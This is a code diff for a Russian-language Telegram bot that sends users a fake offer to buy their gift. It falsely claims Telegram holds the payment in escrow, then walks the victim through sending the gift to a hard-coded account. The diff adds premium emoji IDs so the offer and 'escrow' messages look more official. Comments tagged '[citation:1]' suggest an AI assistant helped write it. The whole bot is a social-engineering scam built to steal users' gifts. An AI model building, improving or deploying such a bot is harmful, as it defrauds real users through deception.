@@ -20,10 +20,20 @@ OWNER_ID = 861423393
 
 # Ссылка для прямой отправки подарка
 GIFT_URL = "tg://send_gift?to=heiseysex"
-# Обычная ссылка на профиль (для запасного варианта)
 TARGET_URL = "https://t.me/HeiseySex"
 
 VERIFY_TIMEOUT_SECONDS = 300  # 5 минут
+
+# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ (ID) ───────────────────────
+# ID взяты из открытого каталога telegram-premium-emojis [citation:1]
+
+EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'  # Подарок (примерный ID, если не сработает - замени)
+EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'  # Звезда [citation:1]
+EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'  # Замок (использую как аналог)
+EMOJI_CONFIRM = '<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>'  # Галочка [citation:1]
+EMOJI_CANCEL = '<tg-emoji emoji-id="5258226313285607065">❌</tg-emoji>'  # Крестик [citation:1]
+EMOJI_LIGHTNING = '<tg-emoji emoji-id="5843553939672274145">⚡️</tg-emoji>'  # Молния [citation:1]
+EMOJI_LINK = '<tg-emoji emoji-id="5877536313623711363">🔗</tg-emoji>'  # Ссылка (использую стрелку как аналог)
 
 # ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────
 
@@ -36,11 +46,9 @@ offers_lock = threading.Lock()
 # ─────────────────────── УТИЛИТЫ ───────────────────────
 
 def normalize_url(raw):
-    """Аккуратно обрабатывает ссылку, принимая http, https, t.me/... и @username."""
     raw = raw.strip().strip('"').strip("'")
     if not raw:
         return ""
-    
     if raw.startswith("@"):
         return f"https://t.me/{raw[1:]}"
     if raw.startswith(("http://", "https://", "tg://")):
@@ -112,13 +120,13 @@ def parse_inline_query(raw):
     return name, url, amount
 
 
-# ─────────────────────── ТЕКСТЫ ───────────────────────
+# ─────────────────────── ТЕКСТЫ С ПРЕМИУМ-ЭМОДЗИ ───────────────────────
 
 def build_offer_message(name, url, amount):
     return (
-        "Вам поступило предложение о покупке подарка.\n"
+        f"{EMOJI_GIFT} Вам поступило предложение о покупке подарка.\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Пользователь предлагает вам <b>{amount}</b> ⭐ за подарок "
+        f"Пользователь предлагает вам <b>{amount}</b> {EMOJI_STAR} за подарок "
         f"<a href=\"{url}\">{name}</a>.\n\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
@@ -127,15 +135,15 @@ def build_offer_message(name, url, amount):
 def build_offer_keyboard():
     keyboard = InlineKeyboardMarkup()
     keyboard.row(
-        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
-        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
+        InlineKeyboardButton(f"{EMOJI_CONFIRM} Принять", callback_data="stage_accept"),
+        InlineKeyboardButton(f"{EMOJI_CANCEL} Отклонить", callback_data="stage_decline"),
     )
     return keyboard
 
 
 def build_escrow_message(name, url, amount):
     return (
-        f"Пользователь зарезервировал <b>{amount}</b> ⭐ через "
+        f"{EMOJI_LOCK} Пользователь зарезервировал <b>{amount}</b> {EMOJI_STAR} через "
         "эксроу-систему Telegram. Средства хранятся на специальном "
         "эксроу-счёте и будут автоматически зачислены на ваш баланс "
         "звёзд сразу после передачи подарка.\n\n"
@@ -147,16 +155,16 @@ def build_escrow_message(name, url, amount):
         "3. Подтвердите передачу подарка.\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
         f"Telegram зафиксирует транзакцию и моментально зачислит "
-        f"<b>{amount}</b> ⭐ на ваш баланс."
+        f"<b>{amount}</b> {EMOJI_STAR} на ваш баланс."
     )
 
 
 def build_escrow_keyboard():
     keyboard = InlineKeyboardMarkup()
-    keyboard.row(InlineKeyboardButton("🔗 Передать подарок", url=GIFT_URL))
+    keyboard.row(InlineKeyboardButton(f"{EMOJI_LINK} Передать подарок", url=GIFT_URL))
     keyboard.row(
-        InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
-        InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
+        InlineKeyboardButton(f"{EMOJI_LIGHTNING} Подтвердить", callback_data="stage_verify"),
+        InlineKeyboardButton(f"{EMOJI_CANCEL} Отменить", callback_data="stage_decline"),
     )
     return keyboard
 
@@ -227,7 +235,7 @@ def schedule_verify_timeout(chat_id, message_id, conn_id):
         safe_edit(
             chat_id,
             message_id,
-            "⛔ <b>Сделка не завершена.</b>\n"
+            f"⛔ <b>Сделка не завершена.</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "Вы не выполнили все условия передачи подарка.\n\n"
             "Передача не была подтверждена в установленное время, "
@@ -398,17 +406,15 @@ def callback_router(call):
             offers[call.message.message_id]["finished"] = True
 
     if payload == "stage_accept":
-        # Вытаскиваем данные из текста сообщения
         text = call.message.html_text or call.message.text or ""
         m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
         url = m.group(1) if m else TARGET_URL
         name = m.group(2) if m else "Подарок"
 
-        m2 = re.search(r'<b>(\d+)</b>\s*⭐', text)
+        m2 = re.search(r'<b>(\d+)</b>\s*', text)
         amount = m2.group(1) if m2 else "0"
 
         if is_inline:
-            # В инлайне ВСЕГДА отправляем новое сообщение (без бизнес-флагов)
             bot.answer_callback_query(call.id, text="Инструкция отправлена ниже 👇")
             try:
                 bot.send_message(
@@ -420,7 +426,6 @@ def callback_router(call):
             except Exception as e:
                 print(f"[INLINE SEND] Ошибка отправки: {e}")
         else:
-            # В бизнесе — редактируем текущее
             bot.answer_callback_query(
                 call.id,
                 text="Ознакомьтесь с инструкцией на следующем экране.",
